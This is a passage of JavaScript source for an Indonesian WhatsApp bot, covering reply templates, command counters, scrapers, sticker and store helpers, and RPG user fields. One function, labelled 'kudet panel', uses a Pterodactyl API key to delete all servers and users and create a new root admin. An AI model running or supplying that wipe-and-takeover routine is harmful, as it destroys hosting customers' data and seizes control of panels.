            newsletterJid: global.idch,
            serverMessageId: 100,
            newsletterName: botname
            },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: hariini,
      previewType: "PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }
      
  //BotAdmin
  const Xbotadmin = async() =>{
  let toks = Styles(`Jadikan Bot Sebagai Admin Terlebih Dahulu`)
      let contextInfo = {
        forwardingScore: 999,
          isForwarded: true,
           mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
            newsletterJid: global.idch,
            serverMessageId: 100,
            newsletterName: botname
            },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
  }
  
  //onlyPremium
  const Xpremium = async() =>{
    let toks = Styles(`Kamu Bukan User Vip ( Premium Vip )` )
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      } 

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }
      
  //onlyGroup  
   const Xgroup = async() =>{
  let toks = Styles(`Khusus Group Chat!`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌',
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }
      
   const Xlimit = async() =>{
  let toks = Styles(`1 limit terpakai`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdReply: {
      showAdAttribution: true,
      title: `Tersisa ${limitnya} Limit`,
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }      
      
  //Banned Message
   const Xban = async() =>{
  let toks = Styles(`kamu sedang di band oleh owner`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌ Kamu telah di banned !!',
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }      
      
        //pc
  const Xpc = async() =>{
  let toks = Styles(`Command Untuk Private Message`)
      let contextInfo = {
        forwardingScore: 999,
          isForwarded: true,
           mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
            newsletterJid: global.idch,
            serverMessageId: 100,
            newsletterName: botname
            },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌ Command Kamu Dibatasi !!',
      body: hariini,
      previewType: "PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }
      
      // Error
       const Xerror = async() =>{
  let toks = Styles(`Fitur Sedang Error, Silahkan Menunggu Sampai Di Fix Owner`)
      let contextInfo = {
          forwardingScore: 999,
        isForwarded: true,
         mentionedJid: [m.sender],
          forwardedNewsletterMessageInfo: {
          newsletterJid: global.idch,
          serverMessageId: 100,
          newsletterName: botname
          },
      externalAdReply: {
      showAdAttribution: true,
      title: '❌ Maaf kak, fitur sedang dalam perbaikan',
      body: hariini,
      previewType:"PHOTO",
      thumbnailUrl: thumb,
      sourceUrl: ig, 
      }
      }

      Alice.sendMessage(from, { contextInfo, text: `${toks}`}, { quoted: m })
      }      
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

const getAllCases = () => {
  var mytext = fs.readFileSync("./Alice.js").toString();
  var regex = /case\s+'(.*?)'/g;
  var cases = [];
  var match;
  while ((match = regex.exec(mytext)) !== null) {
      cases.push(match[1]);
  }
  return cases;
};


// Top Cmd
// Lokasi Data Command
const topcmd = './AliceDatabase/AliceTop.json';
// Cek Dan Load Database
if (!fs.existsSync(topcmd)) {
    fs.writeFileSync(topcmd, JSON.stringify({})); // Buat File Kalau Belum Ada
}
try {
    global.topcmd = JSON.parse(fs.readFileSync(topcmd));
} catch (err) {
    console.log("Database Rusak Atau Kosong! Reset Ulang");
    global.topcmd = {};
    fs.writeFileSync(topcmd, JSON.stringify(global.topcmd, null, 2));
}

// SImpan Data Cmd
const saveTopCmd = () => {
  fs.writeFileSync(topcmd, JSON.stringify(global.topcmd, null, 2));
}; 

// Top Command
const allCases = getAllCases();
if (allCases.includes(command)) {
    if (!global.topcmd[command]) {
        global.topcmd[command] = 1;
    } else {
        global.topcmd[command] += 1;
    }
    saveTopCmd(); // Simpan data setiap kali ada perubahan
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//RESET / KUDET PANEL 
let passwordaseli = '';

const generateRandomPassword = () => {
    passwordaseli = `${ownername}` + Math.random().toString(36).substring(7);
};

const PermenReset = async (apiKey, panelUrl, userIdToKeep) => {
    const headers = {
        'Content-Type': 'application/json',
        'Accept': 'Application/vnd.pterodactyl.v1+json',
        'Authorization': `Bearer ${apiKey}`
    };

    const fetchJson = async (url, options = {}) => {
        console.log(`Fetching URL: ${url}`);
        const response = await fetch(url, { headers, ...options });
        const text = await response.text();

        if (!response.ok) {
            if (response.status === 401) {
                throw new Error("\`Plta\` Nya \`Invalid\` Gblok");
            } else if (response.status === 403) {
                throw new Error("\`Plta\` Nya \`Gak Full Mid\` Ini Anjeng");
            } else if (response.status === 502) {
                throw new Error("Panel Mu \`Kena DDoS\` Kang Gabisa Di Akses Nih");
            }
        }

        try {
            return JSON.parse(text);
        } catch (error) {
            console.error(`Failed to parse JSON response from ${url}: ${text}`);
        }
    };

    const getAllItems = async (endpoint) => {
        const data = await fetchJson(`${panelUrl}/api/application/${endpoint}`);
        return data?.data || [];
    };

    const deleteServer = async (serverId) => {
        await fetchJson(`${panelUrl}/api/application/servers/${serverId}`, { method: 'DELETE' });
        console.log(`Deleted server ID: ${serverId}`);
    };

    const deleteUser = async (userId) => {
        await fetchJson(`${panelUrl}/api/application/users/${userId}`, { method: 'DELETE' });
        console.log(`Deleted user ID: ${userId}`);
    };

    const createAdminUser = async () => {
        const newUser = {
            username: `${ownername}`,
            email: 'xyro@reset.com',
            first_name: `${ownername}`,
            last_name: `${ownername}`,
            password: passwordaseli,
            root_admin: true,
            language: 'en'
        };
        return fetchJson(`${panelUrl}/api/application/users`, {
            method: 'POST',
            body: JSON.stringify(newUser)
        });
    };

    const servers = await getAllItems('servers');
    servers.forEach(async (server) => {
        if (server.attributes.user_id !== parseInt(userIdToKeep)) {
            await deleteServer(server.attributes.id);
        }
    });

    const users = await getAllItems('users');
    users.forEach(async (user) => {
        if (user.attributes.id !== parseInt(userIdToKeep)) {
            await deleteUser(user.attributes.id);
        }
    });

    const newAdminUser = await createAdminUser();
    return `Deleted all servers and users. Created new admin user: ${newAdminUser.attributes.username}, ID: ${newAdminUser.attributes.id}`;
};

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// FUNCTION ↓↓
//🌌——————————————————————————————————————————————————————————————————————————🌌\\		

    // Fungsi untuk mengunggah file ke Catbox
    async function uploadToCatbox(filePath) {
        try {
            if (!fs.existsSync(filePath)) {
                throw new Error("File not found");
            }

            const form = new FormData();
            form.append('reqtype', 'fileupload');
            form.append('fileToUpload', fs.createReadStream(filePath));

            const response = await axios.post('https://catbox.moe/user/api.php', form, {
                headers: {
                    ...form.getHeaders()
                }
            });

            if (response.status === 200 && response.data) {
                return response.data.trim(); // Mengembalikan URL file yang diunggah
            } else {
                throw new Error(`Upload failed with status: ${response.status}`);
            }
        } catch (err) {
            throw new Error(`Upload failed: ${err.message}`);
        }
    }		        

		
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\		
// Function isUrl
function isURL(e) {
  try { 
    return new URL(e),!0
    } catch (e) 
{ return!1 }
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

// FUNCTION BRAT
function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Make Stickr From Url
async function makeStickerFromUrl(imageUrl, Alice, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await Alice.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `${botname}`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: thumb, 
                    sourceUrl: ig
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        ReplyRynzz('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Scrape Nonton Anime
const base = {
  latest: "https://nontonanime.live/",
  orderAnime: "https://nontonanime.live/anime/?status&type&order",
  search: "https://nontonanime.live/?s=",
};

const nontonAnime = {
  latest: async () => {
    const { data } = await axios.get(base.latest);
    const $ = cheerio.load(data);
    return $(".listupd.normal .bsx a").map((_, el) => ({
      title: $(el).attr("title"),
      url: $(el).attr("href"),
      episode: $(el).find(".bt .epx").text().trim(),
      type: $(el).find(".limit .typez").text().trim(),
      thumbnail: $(el).find(".lazyload").attr("data-src") || $(el).find("img").attr("src"),
    })).get();
  },

  upcoming: async () => {
    const { data } = await axios.get(base.orderAnime);
    const $ = cheerio.load(data);
    return $(".listupd .bsx a").map((_, el) => {
      const episode = $(el).find(".bt .epx").text().trim();
      if (episode.toLowerCase() !== "upcoming") return null;
      return {
        title: $(el).attr("title"),
        url: $(el).attr("href"),
        episode,
        type: $(el).find(".limit .typez").text().trim(),
        thumbnail: $(el).find(".lazyload").attr("data-src") || $(el).find("img").attr("src"),
      };
    }).get().filter(Boolean);
  },

  search: async (q) => {
    const { data } = await axios.get(base.search + encodeURIComponent(q));
    const $ = cheerio.load(data);
    return $(".bsx a").map((_, el) => ({
      title: $(el).attr("title"),
      url: $(el).attr("href"),
      episode: $(el).find(".bt .epx").text().trim(),
      type: $(el).find(".limit .typez").text().trim(),
      thumbnail: $(el).find(".lazyload").attr("data-src") || $(el).find("img").attr("src"),
    })).get();
  },

  details: async (url) => {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);
    return {
      title: $("h1.entry-title").text().trim(),
      thumbnail: $(".bigcover .lazyload").attr("data-src") || $(".bigcover img").attr("src"),
      synopsis: $(".entry-content p").first().text().trim(),
      status: $(".info-content .spe span:contains('Status')").text().replace("Status:", "").trim(),
      studio: $(".info-content .spe span:contains('Studio') a").text().trim(),
      season: $(".info-content .spe span:contains('Season') a").text().trim(),
      type: $(".info-content .spe span:contains('Type')").text().replace("Type:", "").trim(),
    };
  },

  download: async (url) => {
    const { data } = await axios.get(url);
    const $ = cheerio.load(data);
    const links = [];

    $(".mirror option").each((_, el) => {
      const val = $(el).attr("value");
      if (val) {
        const buf = Buffer.from(val, "base64").toString("utf-8");
        const link = buf.includes("<iframe") ? cheerio.load(buf)("iframe").attr("src") : buf;
        links.push(`• ${$(el).text().trim()}:\n${link}`);
      }
    });

    return links;
  }
};
//——————————————————————————————————————————————————————————————————————————🌌\\
// Function Reaction 
const reaction = async (jidss, emoji) => {
    Alice.sendMessage(jidss, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function xreaction() {
    await Alice.sendMessage(from, { react: { text: alicewait, key: m.key } });
    await delay(100)
    await Alice.sendMessage(from, { react: { text: alicedone, key: m.key } });
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Function Send Music
async function sendMusic(teks) {
    let img = { url : thumb, 
               type : "image/jpeg"
              }
          
    let url = `${channel}`
    let contextInfo = {
        externalAdReply: {    
            showAdAttribution: true,    
            title: ownername,      
            body: `${botname} -`,     
            description: 'Now Playing ....',   
            mediaType: 2,     
            thumbnailUrl: img.url,
            mediaUrl: url   
        }
    }
    
    Alice.sendMessage(m.chat, { 
        contextInfo,
        mimetype: 'audio/mp4',
        audio: teks
    }, { quoted: m })
 }


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
//Batas Set
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
/* =================| GC SIDER |==================== */
const GcSiderUpdate = (userId, serverId) => {
    if (db_sider[serverId]) {
        const userIndex = db_sider[serverId].findIndex(user => user.user_id === userId);
        if (userIndex !== -1) {
           db_sider[serverId][userIndex].timestamp = timestamp;
        } else {
            db_sider[serverId].push({
                user_id: userId,
                tanggal: hariini,
                timestamp: timestamp
            });
        }
    } else {
        db_sider[serverId] = [{
            user_id: userId,
            tanggal: hariini,
            timestamp: timestamp
        }];
    }
    try {
        fs.writeFileSync("./AliceSystem/AliceDatabase/Group/sider.json", JSON.stringify(db_sider, null, 2));
    } catch (error) {
        console.error("Error writing to file:", error);
    }
};

//————————————————————————//

async function sendReact(teks, key = m.key) { 
  Alice.sendMessage(m.chat, {react: {text: teks, key: key}})
}
//————————————————————————//
function handleFeatureToggle(feature, command) {
    if (!m.isGroup) return Xgroup();
    if (!isBotAdmins) return Xbotadmin;
    if (!isAdmins && !isOwner) return Xadmin();
    if (args.length < 1) return ReplyRynzz('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan');

    if (args[0] === 'on') {
        db.data.chats[from][feature] = true;
        return ReplyRynzz(`${command} is enabled`);
    } else if (args[0] === 'off') {
        db.data.chats[from][feature] = false;
        return ReplyRynzz(`${command} is disabled`);
    }
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Luminai
        async function luminAi(
    teks,
    pengguna = null,
    prompt = null,
    modePencarianWeb = false
  ) {
    try {
      const data = { content: teks };
      if (pengguna !== null) data.user = pengguna;
      if (prompt !== null) data.prompt = prompt;
      data.webSearchMode = modePencarianWeb;
  
      const { data: res } = await axios.post(
        "https://luminai.my.id/",
        data
      );
      return res.result;
    } catch (error) {
      console.error("Terjadi kesalahan:", error);
      throw error;
    }
  }    

async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Generated User ID: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// PRODUK STORE
//————————————————————————//
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

const tujuanA = path.join(__dirname, 'AliceDatabase', 'products.json');
const tujuanB = path.join(__dirname, 'AliceDatabase', 'historyt.json');
const tujuanC = path.join(__dirname, 'AliceDatabase', 'discounts.json');

function getDisczz() {
    if (!fs.existsSync(tujuanC)) {
        fs.writeFileSync(tujuanC, '[]', 'utf-8');
    }
    const discountData = fs.readFileSync(tujuanC, 'utf-8');
    return JSON.parse(discountData);
}

function addDisczz(productName, discountPrice, expirationDate) {
    const discounts = getDisczz();
    const newDiscount = {
        produk: productName,
        harga_diskon: discountPrice,
        kadaluarsa: expirationDate
    };
    discounts.push(newDiscount);
    simpenDisc(discounts);
}

function getprodukDariFile() {
    if (!fs.existsSync(tujuanA)) {
        fs.writeFileSync(tujuanA, '[]', 'utf-8');
    }
    const productData = fs.readFileSync(tujuanA, 'utf-8');
    return JSON.parse(productData);
}

function simpenProduknya(products) {
    fs.writeFileSync(tujuanA, JSON.stringify(products, null, 2), 'utf-8');
}

function getidProduk(products) {
    if (products.length === 0) {
        return 1;
    }
    const lastProduct = products[products.length - 1];
    return lastProduct.produk + 1;
}

function cekProduknye(productName) {
    const products = getprodukDariFile();
    return products.some(product => product.nama.toLowerCase() === productName.toLowerCase());
}

function addprodukzz(name, price, stock) {
    const products = getprodukDariFile();
    const newProduct = {
        produk: getidProduk(products),
        nama: name,
        harga: price,
        stok: stock
    };
    products.push(newProduct);
    simpenProduknya(products);
}

function delprodukzz(productName) {
    let products = getprodukDariFile();
    products = products.filter(product => product.nama.toLowerCase() !== productName.toLowerCase());
    simpenProduknya(products);
}

function updprodukzz(name, price, stock) {
    let products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());
    if (productIndex !== -1) {
        products[productIndex].harga = price;
        products[productIndex].stok = stock;
        simpenProduknya(products);
    }
}

function getprodukdb() {
    return getprodukDariFile();
}

function simpenSmTr(transactions) {
    fs.writeFileSync(tujuanB, JSON.stringify(transactions, null, 2), 'utf-8');
}

function getSmTr() {
    if (!fs.existsSync(tujuanB)) return [];
    return JSON.parse(fs.readFileSync(tujuanB));
}

function getTrId(id) {
    const transactions = getSmTr();
    return transactions.find(t => t.id.trim() === id.trim());
}

function cIdTrnya() {
    const transactions = getSmTr();
    return `TRANS${transactions.length + 1}`;
}

function saveTrnye(transaction) {
    const transactions = getSmTr();
    transactions.push(transaction);
    simpenSmTr(transactions);
}

function simpenDisc(discounts) {
    fs.writeFileSync(tujuanC, JSON.stringify(discounts, null, 2), 'utf-8');
}


function persenDiskonnya(originalPrice, discountPrice) {
    return Math.round(((originalPrice - discountPrice) / originalPrice) * 100);
}

function ngerestokk(name, quantity) {
    const products = getprodukDariFile();
    const productIndex = products.findIndex(product => product.nama.toLowerCase() === name.toLowerCase());

    if (productIndex !== -1) {
        products[productIndex].stok += quantity;
        simpenProduknya(products);
        return products[productIndex];
    } else {
        return null
    }
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//————————————————————————//
// GET GROUP NAME
async function getGcName(groupID) {
try {
let data_name = await Alice.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
}
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\



//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// ADD COUNT COMMAND
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./AliceDatabase/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./AliceDatabase/command.json',JSON.stringify(_db, null, 2));
}
}
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Resize
const resize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// PickRandom
		function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
	
		
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Altag Khusus Owner ( Group )
//————————————————————————//

if (budy.includes("@altag")) {
    if(!isOwner) return
    if (m.isGroup) {
        if (isAdmins || isBotAdmins) {
            return Alice.sendMessage(m.chat, {
                text: body.replace(/@altag/i, '@' + m.chat),
                contextInfo: {
                    mentionedJid: (await Alice.groupMetadata(m.chat)).participants.map(v => v.id),
                    groupMentions: [{
                        groupSubject: "altag",
                        groupJid: m.chat
                    }]
                }
            })
        }
    }
    }

//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//🌌——————————————————————————————————————————————————————————————————————————🌌\\
// Respon List

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
            var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
            if (get_data_respon.isImage === false) {
                Alice.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
                    quoted: m
                })
            } else {
                Alice.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
                    quoted: m
                })
            }
        }
   
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\

//————————————————————————////————————————————————————//
//————————————————————————//
// Sett Group
let chats = global.db.data.chats[from]
               if (typeof chats !== 'object') global.db.data.chats[from] = {}
               if (chats) {
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antilinkkick' in chats)) chats.antilinkkick = false
		       	  if (!('antispam' in chats)) chats.antispam = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false 
                
               } else global.db.data.chats[from] = {
                  antibot: false,
                  antiviewonce: false,                  
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antispam: false,                  
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antipromotion: false,
                  antilinkkick: false,                             
                  antilinkgc: false                 
               }
//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//🌌——————————————————————————————————————————————————————————————————————————🌌\\


//🌌——————————————————————————————————————————————————————————————————————————🌌\\
//————————————————————————//
// Userrr Rpg
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = (isOwner || isPrem) ? 'Unlimited' : freelimit
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!('chatbot' in user)) user.chatbot = false
if (!('chatbotlast' in user)) user.chatbotlast = ''
if (!('botlast' in user)) user.botlast = ''
if (!isNumber(user.money)) user.money = 0
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0
if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.exp)) user.exp = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 0
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
